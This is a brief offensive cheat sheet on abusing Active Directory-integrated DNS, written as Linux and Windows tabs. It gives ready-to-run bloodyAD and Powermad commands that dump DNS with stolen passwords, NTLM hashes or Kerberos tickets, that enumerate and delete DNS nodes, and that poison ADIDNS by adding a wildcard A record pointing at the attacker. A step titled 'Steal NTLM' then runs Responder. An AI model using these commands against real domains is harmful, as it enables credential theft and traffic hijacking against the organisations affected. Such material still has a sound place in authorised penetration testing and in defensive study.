---
title: "ADIDNS"
date: 2024-11-9
tags: ["Domain", "ADIDNS", "ADDS", "DNS", "PowerMad", "DNS Posioning", "Spoofing", "Windows", "Active Directory"]
---

### Basic

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. DNS Dump

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get dnsDump
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get dnsDump
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> get dnsDump
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Module

```console
. .\Powermad.ps1
```

#### 2. Enum

```console
# Get ADIDNS Zone
Get-ADIDNSZone
```

```console
# Get ADIDNS Permissions
Get-ADIDNSPermission
```

```console
# Remove a Node
Remove-ADIDNSNode -Node *
```

{{< /tabcontent >}}

### Abuse #1: ADIDNS Poisoning

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Add a New A Record

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console
# Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

#### 2. Steal NTLM

```console
sudo responder -I tun0
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import Module

```console
. .\Powermad.ps1
```

#### 2. Create a New Node

```console
$dnsRecord = New-DNSRecordArray -Type A -Data <LOCAL_IP>
```

```console
New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose
```

#### 3. Check

```console
Resolve-DnsName DoesNotExist
```

#### 4. Steal NTLM

```console
sudo responder -I tun0
```

{{< /tabcontent >}}